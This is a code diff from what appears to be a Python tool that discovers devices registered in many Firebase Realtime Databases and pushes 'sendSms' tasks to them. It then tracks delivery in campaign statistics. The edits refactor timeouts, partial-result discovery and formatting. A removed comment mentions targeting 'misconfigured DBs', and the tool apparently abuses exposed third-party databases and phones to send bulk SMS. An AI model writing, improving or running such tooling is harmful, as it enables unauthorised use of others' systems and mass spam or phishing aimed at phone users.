@@ -611,12 +611,12 @@ def _load_urls() -> list[str]:
 
 RTDB_URLS: list[str] = _load_urls()
 
-MAX_SMS_PER_DB   = 60     # per device
+MAX_SMS_PER_DB   = 60
 CONCURRENT_WRITE = 200
 POLL_INTERVAL    = 8
 POLL_TIMEOUT     = 300
-_DISCOVER_TIMEOUT = 10    # per-request timeout during discovery
-_DISCOVER_TOTAL   = 45   # hard wall for the whole scan
+_DISCOVER_TIMEOUT = 10   # per-request
+_DISCOVER_TOTAL   = 60  # hard wall — asyncio.wait returns partial results
 
 
 @dataclass
@@ -640,7 +640,11 @@ async def _get(
     timeout: float = 8.0,
 ) -> Optional[dict]:
     try:
-        async with session.get(url, timeout=aiohttp.ClientTimeout(total=timeout), ssl=False) as r:
+        async with session.get(
+            url,
+            timeout=aiohttp.ClientTimeout(total=timeout),
+            ssl=False,
+        ) as r:
             if r.status == 200:
                 return await r.json(content_type=None)
     except Exception:
@@ -650,7 +654,9 @@ async def _get(
 
 async def _put(session: aiohttp.ClientSession, url: str, data: dict) -> bool:
     try:
-        async with session.put(url, json=data, timeout=aiohttp.ClientTimeout(total=8), ssl=False) as r:
+        async with session.put(
+            url, json=data, timeout=aiohttp.ClientTimeout(total=8), ssl=False
+        ) as r:
             return r.status in (200, 201)
     except Exception:
         return False
@@ -660,7 +666,11 @@ async def _get_devices_one(
     session: aiohttp.ClientSession,
     db_url: str,
 ) -> list[RtdbDevice]:
-    data = await _get(session, f"{db_url}/registeredDevices.json?shallow=true", timeout=_DISCOVER_TIMEOUT)
+    data = await _get(
+        session,
+        f"{db_url}/registeredDevices.json?shallow=true",
+        timeout=_DISCOVER_TIMEOUT,
+    )
     if not data or not isinstance(data, dict):
         return []
     return [
@@ -670,24 +680,29 @@ async def _get_devices_one(
 
 
 async def discover_all_devices() -> list[RtdbDevice]:
-    # ssl=False skips cert verification — prevents SSL handshake hangs on misconfigured DBs
-    connector = aiohttp.TCPConnector(limit=300, limit_per_host=5, ssl=False)
-    async with aiohttp.ClientSession(connector=connector) as session:
-        try:
-            results = await asyncio.wait_for(
-                asyncio.gather(
-                    *[_get_devices_one(session, url) for url in RTDB_URLS],
-                    return_exceptions=True,
-                ),
-                timeout=_DISCOVER_TOTAL,
-            )
-        except asyncio.TimeoutError:
-            results = []
+    # asyncio.wait with timeout = collect partial results instead of losing everything
+    connector = aiohttp.TCPConnector(limit=300, limit_per_host=5)
+    devices: list[RtdbDevice] = []
 
-    devices = []
-    for r in results:
-        if isinstance(r, list):
-            devices.extend(r)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        tasks = [
+            asyncio.ensure_future(_get_devices_one(session, url))
+            for url in RTDB_URLS
+        ]
+        done, pending = await asyncio.wait(tasks, timeout=_DISCOVER_TOTAL)
+
+        # cancel stragglers
+        for t in pending:
+            t.cancel()
+
+        for t in done:
+            try:
+                r = t.result()
+                if isinstance(r, list):
+                    devices.extend(r)
+            except Exception:
+                pass
+
     return devices
 
 
@@ -781,7 +796,7 @@ async def poll_stats(
         elapsed = time.time() - write_time
 
         grand = CampaignStats(total=total)
-        connector = aiohttp.TCPConnector(limit=100, ssl=False)
+        connector = aiohttp.TCPConnector(limit=100)
         async with aiohttp.ClientSession(connector=connector) as session:
             for db_url, device_id, task_key in task_log:
                 if task_key in done_keys:
@@ -791,7 +806,6 @@ async def poll_stats(
                 rec = await _get(session, f"{db_url}/sendSms/{device_id}/{task_key}.json")
 
                 if not rec or not isinstance(rec, dict):
-                    # Record gone after 5s = device consumed it = sent
                     if elapsed > 5:
                         grand.sent += 1
                         done_keys.add(task_key)
